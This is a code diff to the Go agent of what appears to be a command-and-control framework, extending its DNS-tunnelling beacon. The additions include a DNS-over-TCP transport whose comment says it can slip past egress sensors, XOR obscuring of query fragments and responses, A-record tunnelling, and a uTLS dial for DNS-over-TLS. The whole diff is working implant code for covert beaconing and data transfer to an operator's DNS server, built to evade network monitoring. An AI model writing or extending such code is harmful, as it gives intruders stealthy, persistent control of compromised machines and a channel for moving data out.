@@ -5,7 +5,7 @@ package main
 
 import (
 	"bytes"
-	"crypto/tls"
+	"context"
 	"encoding/base32"
 	"encoding/base64"
 	"encoding/binary"
@@ -18,11 +18,14 @@ import (
 )
 
 // sendDNSBeacon performs a DNS TXT-based C2 beacon.
-// It builds one or more TXT queries with the agent UUID, fragment metadata and
+// It builds one or more queries with the agent UUID, fragment metadata and
 // base32-encoded JSON request fragments in the subdomain, sends them to the C2
-// DNS server, and reads the TXT response. Requests larger than one DNS qname
-// can carry are split into fragments, each below the 253-character qname limit.
-// Supports UDP, DNS-over-HTTPS (DoH), and DNS-over-TLS (DoT) based on config.
+// DNS server, and reads the response. Requests larger than one DNS qname can
+// carry are split into fragments, each below the 253-character qname limit.
+// Supports UDP, DNS-over-TCP (RFC 1035), DNS-over-HTTPS (DoH), and
+// DNS-over-TLS (DoT) based on config. The response record type (TXT, AAAA or A)
+// is selected by the DNSIPv6 / DNSARecordTunnel flags; the server picks the
+// matching tunnel automatically from the query type.
 func sendDNSBeacon(body []byte) []byte {
 	domain := DNSDomain
 	if domain == "" {
@@ -37,27 +40,74 @@ func sendDNSBeacon(body []byte) []byte {
 	uuidHex := hexEncodedUUID(agentUUID)
 	queries := buildDNSQueryNames(uuidHex, body)
 
-	// Determine DNS transport: DoH > DoT > UDP
+	// Determine DNS transport: DoH > DoT > TCP > UDP
 	dohURL := DNSDoHURL
 	dotAddr := DNSDoTAddr
 
 	var lastResp []byte
 	for i, qname := range queries {
 		var resp []byte
-		if dohURL != "" {
+		switch {
+		case dohURL != "":
 			resp = sendDNSDoH(dohURL, qname)
-		} else if dotAddr != "" {
+		case dotAddr != "":
 			resp = sendDNSDoT(dotAddr, qname)
-		} else {
+		case DNSTCP:
+			resp = sendDNSTCP(dnsServer, qname)
+		default:
 			resp = sendDNSUDP(dnsServer, qname)
 		}
 		if i == len(queries)-1 {
 			// Only the final fragment carries the full response; intermediate
-			// queries are acknowledged with a blank TXT which parses to nil.
+			// queries are acknowledged with a blank record which parses to nil.
 			lastResp = resp
 		}
 	}
+
+	// Reverse the response-side XOR obscuring (keyed by the agent UUID, which
+	// the server derives from the same qname label) so the encrypted envelope
+	// is recovered unchanged.
+	if DNSObscure && len(lastResp) > 0 {
+		lastResp = xorBytes(lastResp, dnsObfuscateKey(uuidHex))
+	}
 	return lastResp
+}
+
+// dnsObfuscateKey derives the deterministic XOR key used to obscure DNS
+// fragments and responses. It is keyed by the agent UUID so the server — which
+// learns the UUID from the unobscured qname label — can apply the identical
+// transform without a pre-shared side channel.
+func dnsObfuscateKey(agentID string) []byte {
+	if agentID == "" {
+		return []byte("forgec2")
+	}
+	return []byte(agentID)
+}
+
+// xorBytes applies a repeating-key XOR. It is its own inverse.
+func xorBytes(data, key []byte) []byte {
+	if len(key) == 0 {
+		return data
+	}
+	out := make([]byte, len(data))
+	for i, b := range data {
+		out[i] = b ^ key[i%len(key)]
+	}
+	return out
+}
+
+// dnsQueryType returns the request/response record type for this agent's DNS
+// profile: A-record tunneling (1) when DNSARecordTunnel is set, AAAA (28) when
+// DNSIPv6 is set, otherwise TXT (16).
+func dnsQueryType() uint16 {
+	switch {
+	case DNSARecordTunnel:
+		return 1
+	case DNSIPv6:
+		return 28
+	default:
+		return 16
+	}
 }
 
 // dnsFragmentMaxBody is the maximum plaintext bytes per DNS fragment. 57 bytes
@@ -81,7 +131,11 @@ func buildDNSQueryNames(uuidHex string, body []byte) []string {
 		if end > len(body) {
 			end = len(body)
 		}
-		encoded := base32.StdEncoding.EncodeToString(body[start:end])
+		frag := body[start:end]
+		if DNSObscure {
+			frag = xorBytes(frag, dnsObfuscateKey(uuidHex))
+		}
+		encoded := base32.StdEncoding.EncodeToString(frag)
 		encoded = strings.TrimRight(encoded, "=")
 		meta := fmt.Sprintf("%d_%d", total, i)
 		labels := []string{uuidHex, meta}
@@ -99,10 +153,7 @@ func buildDNSQueryNames(uuidHex string, body []byte) []string {
 
 // sendDNSUDP sends a DNS query via plain UDP.
 func sendDNSUDP(dnsServer, qname string) []byte {
-	qtype := uint16(16) // TXT
-	if DNSIPv6 {
-		qtype = 28 // AAAA
-	}
+	qtype := dnsQueryType()
 	pkt := buildDNSQuery(qname, qtype)
 
 	conn, err := net.DialTimeout("udp", dnsServer+":53", 5*time.Second)
@@ -130,10 +181,7 @@ func sendDNSUDP(dnsServer, qname string) []byte {
 
 // sendDNSDoH sends a DNS query via DNS-over-HTTPS (RFC 8484).
 func sendDNSDoH(dohURL, qname string) []byte {
-	qtype := uint16(16) // TXT
-	if DNSIPv6 {
-		qtype = 28 // AAAA
-	}
+	qtype := dnsQueryType()
 	pkt := buildDNSQuery(qname, qtype)
 
 	req, err := http.NewRequest("POST", dohURL, bytes.NewReader(pkt))
@@ -166,14 +214,12 @@ func sendDNSDoH(dohURL, qname string) []byte {
 
 // sendDNSDoT sends a DNS query via DNS-over-TLS (RFC 7858).
 func sendDNSDoT(dotAddr, qname string) []byte {
-	qtype := uint16(16) // TXT
-	if DNSIPv6 {
-		qtype = 28 // AAAA
-	}
+	qtype := dnsQueryType()
 	pkt := buildDNSQuery(qname, qtype)
 
-	tlsCfg := newAgentTLSConfig("cloudflare-dns.com")
-	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second}, "tcp", dotAddr, tlsCfg)
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	conn, err := utlsDialContext(ctx, "tcp", dotAddr)
 	if err != nil {
 		if Debug {
 			fmt.Printf("[!] DNS DoT dial failed: %v\n", err)
@@ -198,6 +244,47 @@ func sendDNSDoT(dotAddr, qname string) []byte {
 		return nil
 	}
 	if respLen == 0 || respLen > 4096 {
+		return nil
+	}
+	respBody := make([]byte, respLen)
+	if _, err := io.ReadFull(conn, respBody); err != nil {
+		return nil
+	}
+
+	return parseDNSResponse(respBody, qtype)
+}
+
+// sendDNSTCP sends a DNS query over a plain TCP connection (RFC 1035
+// length-prefix framing). Some egress sensors only inspect UDP DNS, so TCP can
+// slip past them; it is also required when a single query/response exceeds the
+// 512-byte UDP datagram limit.
+func sendDNSTCP(dnsServer, qname string) []byte {
+	qtype := dnsQueryType()
+	pkt := buildDNSQuery(qname, qtype)
+
+	conn, err := net.DialTimeout("tcp", dnsServer+":53", 5*time.Second)
+	if err != nil {
+		if Debug {
+			fmt.Printf("[!] DNS TCP dial failed: %v\n", err)
+		}
+		return nil
+	}
+	defer conn.Close()
+
+	conn.SetDeadline(time.Now().Add(10 * time.Second))
+	tcpPkt := make([]byte, 2+len(pkt))
+	binary.BigEndian.PutUint16(tcpPkt[:2], uint16(len(pkt)))
+	copy(tcpPkt[2:], pkt)
+
+	if _, err := conn.Write(tcpPkt); err != nil {
+		return nil
+	}
+
+	var respLen uint16
+	if err := binary.Read(conn, binary.BigEndian, &respLen); err != nil {
+		return nil
+	}
+	if respLen == 0 || respLen > 65535 {
 		return nil
 	}
 	respBody := make([]byte, respLen)
@@ -332,6 +419,10 @@ func parseDNSResponse(pkt []byte, qtype uint16) []byte {
 			// bytes as a base64 chunk so the concatenated string decodes.
 			if rdlength > 0 && offset+int(rdlength) <= len(pkt) {
 				txts = append(txts, string(pkt[offset:offset+int(rdlength)]))
+			}
+		} else if rtype == 1 { // A — A-record tunneling packs the base64 payload into 4-byte rdata chunks.
+			if rdlength == 4 && offset+4 <= len(pkt) {
+				txts = append(txts, string(pkt[offset:offset+4]))
 			}
 		}
 		offset += int(rdlength)
